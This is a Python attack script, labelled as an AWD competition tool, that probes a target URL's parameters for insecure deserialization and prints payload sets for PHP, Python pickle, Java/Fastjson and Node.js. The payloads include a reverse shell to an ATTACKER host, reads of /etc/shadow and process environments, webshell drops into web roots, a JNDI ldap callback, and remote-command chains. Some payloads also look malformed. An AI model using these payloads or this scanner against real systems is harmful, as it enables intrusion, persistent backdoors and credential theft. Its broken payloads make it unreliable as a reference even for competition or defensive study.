#!/usr/bin/env python3
"""
AWD 反序列化漏洞利用工具
支持: PHP/Python/Java/Node.js 反序列化检测与 POP 链构造
"""

import requests
import re
import sys
import base64
import zlib
import gzip
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


class DeserializationExploiter:
    def __init__(self, url, method='GET', data=None, headers=None, cookies=None, timeout=10):
        self.url = url
        self.method = method.upper()
        self.data = data or {}
        self.headers = headers or {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        self.cookies = cookies or {}
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        if self.cookies:
            for k, v in self.cookies.items():
                self.session.cookies.set(k, v)
        self.results = []

    def _send(self, url, data=None):
        try:
            if self.method == 'GET':
                return self.session.get(url, timeout=self.timeout, allow_redirects=True)
            else:
                return self.session.post(url, data=data, timeout=self.timeout, allow_redirects=True)
        except Exception:
            return None

    def _build_url(self, param_name, value):
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)
        params[param_name] = [value]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _build_data(self, param_name, value):
        data = dict(self.data)
        data[param_name] = value
        return data

    def _get_params(self):
        parsed = urlparse(self.url)
        return list(parse_qs(parsed.query).keys()) + list(self.data.keys())

    # ========= 1. PHP 反序列化检测 =========
    def generate_php_payloads(self):
        """生成 PHP 反序列化 Payload"""
        return {
            # 基础检测 - 魔术方法
            'magic_methods': [
                # __wakeup / __destruct
                'O:8:"stdClass":0:{}',
                'O:4:"Test":1:{s:3:"cmd";s:2:"id";}',
                'a:1:{s:3:"cmd";s:2:"id";}',
                # 利用常见类
                'O:11:"FileHandler":2:{s:9:"*file";s:15:"/var/log/auth.log";s:10:"*callback";s:6:"system";}',
                'O:6:"Logger":2:{s:7:"*logFile";s:12:"/var/log/evil";s:9:"*processor";s:6:"system";}',
                # 任意文件读写
                'O:10:"FileReader":1:{s:8:"filename";s:15:"/etc/passwd";}',
                # 命令执行
                'O:4:"Exec":1:{s:4:"cmd";s:2:"id";}',
                # ThinkPHP / Laravel 常见链
                'a:2:{i:0;O:27:"think\\process\\pipes\\Windows":2:{s:9:"*files";a:1:{i:0;s:15:"/var/www/html/test";}s:8:"*files";s:8:"command";}i:1;O:27:"think\\process\\pipes\\Windows":2:{s:9:"*files";a:1:{i:0;s:15:"/var/www/html/test";}s:8:"*files";s:8:"command";}}',
            ],
            # Phar 反序列化
            'phar': [
                'phar://evil.phar/test',
                'phar://./evil.phar/test',
                'phar:///tmp/evil.phar/test',
            ],
            # Session 反序列化
            'session': [
                '|O:8:"stdClass":0:{}',
                'test|O:8:"stdClass":0:{}',
                '|O:4:"Test":1:{s:3:"cmd";s:2:"id";}',
            ],
            # 编码绕过
            'encoded': [
                # Base64 编码序列化
                base64.b64encode(b'O:4:"Test":1:{s:3:"cmd";s:2:"id";}').decode(),
                # URL 编码
                '%4f%3a%34%3a%22%54%65%73%74%22%3a%31%3a%7b%73%3a%33%3a%22%63%6d%64%22%3b%73%3a%32%3a%22%69%64%22%3b%7d',
            ],
            # POP 链 - 基于常见框架
            'pop_chain_thinkphp': [
                # ThinkPHP 5.x RCE
                'a:5:{i:0;O:27:"think\\process\\pipes\\Windows":2:{s:9:"*files";a:1:{i:0;s:15:"/var/www/html/test";}s:8:"*files";s:8:"command";}i:1;O:27:"think\\process\\pipes\\Windows":2:{s:9:"*files";a:1:{i:0;s:15:"/var/www/html/test";}s:8:"*files";s:8:"command";}i:2;O:17:"think\\request\\Route":3:{s:1:"@";O:20:"think\\model\\Merge":2:{s:4:"bind";a:1:{i:0;O:27:"think\\process\\pipes\\Windows":2:{s:9:"*files";a:1:{i:0;s:15:"/var/www/html/test";}s:8:"*files";s:8:"command";}}}}s:6:"method";s:6:"SELECT";s:5:"field";s:1:"*";}i:3;O:27:"think\\process\\pipes\\Windows":2:{s:9:"*files";a:1:{i:0;s:15:"/var/www/html/test";}s:8:"*files";s:8:"command";}i:4;O:27:"think\\process\\pipes\\Windows":2:{s:9:"*files";a:1:{i:0;s:15:"/var/www/html/test";}s:8:"*files";s:8:"command";}}',
            ],
        }

    # ========= 2. Python 反序列化 (pickle) =========
    def generate_python_payloads(self):
        """生成 Python pickle 反序列化 Payload"""
        return {
            'command_execution': [
                # 经典 pickle 命令执行
                'cpos\nsystem\n(S\'id\'\ntR.',
                'cpos\nsystem\n(S\'cat /etc/passwd\'\ntR.',
                'cpos\nsystem\n(S\'id > /tmp/out.txt\'\ntR.',
                'cpos\nsystem\n(S\'bash -c "bash -i >& /dev/tcp/ATTACKER/PORT 0>&1"\'\ntR.',
                'csubprocess\nPopen\n(V(S\'id\'\ntS\'shell\'\nttR.',
                'csbuiltins\nexec\n(S\'__import__("os").system("id")\'\ntR.',
                # base64 编码的 pickle
                base64.b64encode(b'cpos\nsystem\n(S\'id\'\ntR.').decode(),
                # 压缩 + base64
                base64.b64encode(zlib.compress(b'cpos\nsystem\n(S\'id\'\ntR.')).decode(),
            ],
            'file_read': [
                'cbuiltins\nopen\n(S\'/etc/passwd\'\ntcbuiltins\nread\n(tR.',
                'cbuiltins\nopen\n(S\'/etc/shadow\'\ntcbuiltins\nread\n(tR.',
                'cbuiltins\nopen\n(S\'/proc/self/environ\'\ntcbuiltins\nread\n(tR.',
                'cbuiltins\nopen\n(S\'/var/www/html/config.php\'\ntcbuiltins\nread\n(tR.',
            ],
            'file_write': [
                'cbuiltins\nopen\n(S\'/tmp/evil.php\'\ntcbuiltins\nwrite\n(S\'<?php @eval($_POST["cmd"]);?>\'\nttR.',
                'cbuiltins\nopen\n(S\'/var/www/html/shell.php\'\ntcbuiltins\nwrite\n(S\'<?php system($_GET["cmd"]);?>\'\nttR.',
            ],
            'ssrf': [
                'curllib.request\nurlopen\n(S\'http://127.0.0.1:6379/INFO\'\ntR.',
                'curllib.request\nurlopen\n(S\'file:///etc/passwd\'\ntR.',
            ],
        }

    # ========= 3. Java 反序列化 Payload =========
    def generate_java_payloads(self):
        """生成 Java 反序列化 Payload (ysoserial 格式)"""
        return {
            'commons_collections': [
                # CommonsCollections 利用链 (需 ysoserial)
                'CommonsCollections5',
                'CommonsCollections6',
                'CommonsCollections7',
                'CommonsCollections2',
                'CommonsCollections3',
                'CommonsCollections4',
            ],
            'spring': [
                'Spring1',
                'Spring2',
            ],
            'fastjson': [
                # Fastjson 反序列化
                '{"@type":"java.lang.AutoCloseable"}',
                '{"@type":"com.alibaba.fastjson.JSONObject","inputStream":{"@type":"java.lang.AutoCloseable"}}',
                '{"@type":"java.net.Inet4Address","val":"dnslog.test"}',
                '{"a":{"@type":"java.lang.ClassLoader"}}',
                # Fastjson 1.2.68 绕过
                '{"@type":"java.lang.AutoCloseable","@type":"java.lang.AutoCloseable"}',
                '{"@type":"java.lang.invoke.SerializedLambda"}',
                # Fastjson 远程执行
                '{"@type":"com.alibaba.fastjson.JSONObject","@type":"java.lang.AutoCloseable"}',
                '{"@type":"org.apache.catalina.connector.RequestFacade"}',
            ],
            'shiro': [
                # Shiro 反序列化 (RememberMe)
                # 需要构造带有恶意序列化数据的 RememberMe Cookie
                'rememberMe=deadcodedeadcode...',
            ],
            'generating': [
                # 通用反序列化检测
                # 时间盲注
                '{"@type":"java.net.Inet4Address","val":"ldap://ATTACKER:1389/Exploit"}',
                # DNSLog 检测
                '{"@type":"java.lang.String","value":"test.oob.test"}',
            ],
        }

    # ========= 4. Node.js 反序列化 =========
    def generate_nodejs_payloads(self):
        """生成 Node.js 反序列化 Payload"""
        return {
            'vm2_escape': [
                # vm2 逃逸
                'const {execSync} = require("child_process");execSync("id")',
                'this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id")',
                'process.mainModule.require("child_process").exec("id")',
            ],
            'serialize': [
                # node-serialize 反序列化
                '{"__jsfunction":"function(){require(\'child_process\').exec(\'id\')}"}',
                '{"__jsfunction":"function(){return require(\'child_process\').execSync(\'id\').toString()}"}',
                # 自定义序列化
                '{"type":"Buffer","data":[123,34,95,95,106,115,102,117,110,99,116,105,111,110,34,58,34,102,117,110,99,116,105,111,110,40,34,105,100,34,41,34,125]}',
            ],
            'deserialize_cmd': [
                # 反序列化直接 RCE
                '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'id\')}"}',
                '{"rce":"_$$ND_FUNC$$_function (){return require(\'child_process\').execSync(\'id\').toString()}"}',
                # vm.runInThisContext
                '{"rce":"_$$ND_FUNC$$_function (){this.constructor.constructor(\'return process\')().mainModule.require(\'child_process\').execSync(\'id\')}"}',
            ],
        }

    # ========= 5. 序列化数据检测 =========
    def detect_serialization(self):
        """检测目标是否接受序列化数据"""
        print("\n[*] 检测序列化数据处理")

        # 常见序列化格式特征
        php_serial_markers = [b'O:', b'a:', b's:', b'i:', b'N;', b'b:', b'd:']
        python_pickle_markers = [b'\x80', b'cpos', b'cpickle']
        java_serial_markers = [b'\xac\xed', b'\xed\x00']
        node_serial_markers = [b'{"__', b'{"rce"', b'{"__t']

        # 发送序列化检测 Payload
        test_payloads = [
            ('O:8:"stdClass":0:{}', 'PHP Object'),
            ('a:1:{s:4:"test";s:4:"test";}', 'PHP Array'),
            ('cpos\ntest\n(S"test"\ntR.', 'Python Pickle'),
            ('\xac\xed\x00\x05\x73\x72\x00\x05testing', 'Java Serialized'),
            ('{"__jsfunction":"test"}', 'Node.js'),
        ]

        parsed = urlparse(self.url)
        params = list(parse_qs(parsed.query).keys()) + list(self.data.keys())

        for param in params:
            for payload, description in test_payloads:
                if self.method == 'GET':
                    test_url = self._build_url(param, payload)
                    resp = self._send(test_url)
                else:
                    test_data = self._build_data(param, payload)
                    resp = self._send(self.url, test_data)

                if resp is None:
                    continue

                # 检查错误信息
                text = resp.text.lower()
                if any(marker.decode() in text for marker in [b'__wakeup', b'__destruct', b'serialize', b'unserialize', b'pickle', b'deserialize', b'transform', b'ObjectInputStream']):
                    print(f"  [!!!] 反序列化处理确认: 参数={param} 类型={description}")
                    self.results.append({
                        'type': 'deserialization',
                        'param': param,
                        'type_detected': description,
                        'severity': 'critical'
                    })
                elif resp.status_code == 500 and 'error' in text:
                    print(f"  [?] 可能存在反序列化: 参数={param} (500 Error)")
                    self.results.append({
                        'type': 'deserialization_possible',
                        'param': param,
                        'severity': 'medium'
                    })

        return len([r for r in self.results if r.get('type') == 'deserialization']) > 0

    # ========= 6. 完整扫描 =========
    def full_scan(self):
        """执行完整反序列化扫描"""
        print("="*60)
        print("  AWD 反序列化漏洞利用工具")
        print("="*60)
        print(f"目标: {self.url}")

        self.detect_serialization()

        # 输出可用 Payload
        print("\n" + "="*60)
        print("  可用 Payload 汇总")
        print("="*60)

        payload_sets = {
            'PHP': self.generate_php_payloads(),
            'Python': self.generate_python_payloads(),
            'Java': self.generate_java_payloads(),
            'Node.js': self.generate_nodejs_payloads(),
        }

        for lang, payloads in payload_sets.items():
            print(f"\n  [{lang}]")
            for category, payload_list in payloads.items():
                print(f"    {category}:")
                for i, p in enumerate(payload_list[:3], 1):
                    print(f"      [{i}] {str(p)[:80]}")
                if len(payload_list) > 3:
                    print(f"      ... 共 {len(payload_list)} 个")

        if self.results:
            print("\n  漏洞发现:")
            for r in self.results:
                print(f"    [{r.get('severity','info')}] {r.get('type','')} - {r.get('param','')}")

        return self.results


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("用法:")
        print("  python3 deserialization.py <url>")
        print("  python3 deserialization.py <url> --post 'data=xxx'")
        sys.exit(1)

    url = sys.argv[1]
    method = 'GET'
    data = {}

    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == '--post' and i + 1 < len(sys.argv):
            method = 'POST'
            for pair in sys.argv[i+1].split('&'):
                if '=' in pair:
                    k, v = pair.split('=', 1)
                    data[k] = v
            i += 2
        else:
            i += 1

    exploiter = DeserializationExploiter(url, method=method, data=data)
    exploiter.full_scan()
